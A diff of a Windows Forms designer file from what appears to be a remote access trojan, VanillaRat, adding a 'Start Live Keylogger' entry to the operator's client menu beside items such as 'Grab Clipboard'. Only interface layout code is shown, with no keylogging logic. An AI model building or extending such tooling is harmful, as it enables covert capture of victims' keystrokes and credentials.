@@ -55,6 +55,7 @@
             this.btnPreviewMessage = new System.Windows.Forms.ToolStripMenuItem();
             this.clientExtrasToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.btnOpenWebsite = new System.Windows.Forms.ToolStripMenuItem();
+            this.btnStartLiveKeylogger = new System.Windows.Forms.ToolStripMenuItem();
             this.btnStartServer = new System.Windows.Forms.Button();
             this.btnStopServer = new System.Windows.Forms.Button();
             this.btnSettings = new System.Windows.Forms.Button();
@@ -84,7 +85,7 @@
             this.clientCommunicationToolStripMenuItem,
             this.clientExtrasToolStripMenuItem});
             this.ClientMenu.Name = "ClientMenu";
-            this.ClientMenu.Size = new System.Drawing.Size(196, 92);
+            this.ClientMenu.Size = new System.Drawing.Size(196, 114);
             // 
             // clientControlsToolStripMenuItem
             // 
@@ -292,7 +293,8 @@
             // clientExtrasToolStripMenuItem
             // 
             this.clientExtrasToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.btnOpenWebsite});
+            this.btnOpenWebsite,
+            this.btnStartLiveKeylogger});
             this.clientExtrasToolStripMenuItem.Image = global::VanillaRat.Properties.Resources.Flash_On_48px;
             this.clientExtrasToolStripMenuItem.Name = "clientExtrasToolStripMenuItem";
             this.clientExtrasToolStripMenuItem.Size = new System.Drawing.Size(195, 22);
@@ -302,9 +304,17 @@
             // 
             this.btnOpenWebsite.Image = global::VanillaRat.Properties.Resources.Website_48px;
             this.btnOpenWebsite.Name = "btnOpenWebsite";
-            this.btnOpenWebsite.Size = new System.Drawing.Size(151, 22);
+            this.btnOpenWebsite.Size = new System.Drawing.Size(178, 22);
             this.btnOpenWebsite.Text = "Open Website ";
             this.btnOpenWebsite.Click += new System.EventHandler(this.btnOpenWebsite_Click);
+            // 
+            // btnStartLiveKeylogger
+            // 
+            this.btnStartLiveKeylogger.Image = global::VanillaRat.Properties.Resources.Compose_48px;
+            this.btnStartLiveKeylogger.Name = "btnStartLiveKeylogger";
+            this.btnStartLiveKeylogger.Size = new System.Drawing.Size(180, 22);
+            this.btnStartLiveKeylogger.Text = "Start Live Keylogger";
+            this.btnStartLiveKeylogger.Click += new System.EventHandler(this.btnStartLiveKeylogger_Click);
             // 
             // btnStartServer
             // 
@@ -520,6 +530,7 @@
         private System.Windows.Forms.ColumnHeader chTag;
         private System.Windows.Forms.ToolStripMenuItem btnGrabClipboard;
         private System.Windows.Forms.ToolStripMenuItem btnGetHardwareUsage;
+        private System.Windows.Forms.ToolStripMenuItem btnStartLiveKeylogger;
     }
 }
 
